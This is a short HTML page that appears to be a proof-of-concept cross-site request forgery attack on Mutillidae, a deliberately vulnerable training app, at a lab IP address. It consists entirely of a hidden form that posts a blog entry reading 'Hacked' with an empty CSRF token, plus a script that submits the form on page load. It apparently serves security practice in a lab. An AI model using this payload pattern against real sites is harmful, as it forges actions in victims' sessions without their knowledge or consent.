<body>
<form name="csrf" action="http://192.168.146.128/mutillidae/index.php?page=add-to-your-blog.php" method="POST">
		<input name="csrf-token" value="" type="hidden"/>
		<input type="hidden" name='blog_entry' value='Hacked'>
		<input type="hidden" name='add-to-your-blog-php-submit-button' value='Save Blog Entry'>
</form>

<script>document.csrf.submit();</script>
</body>
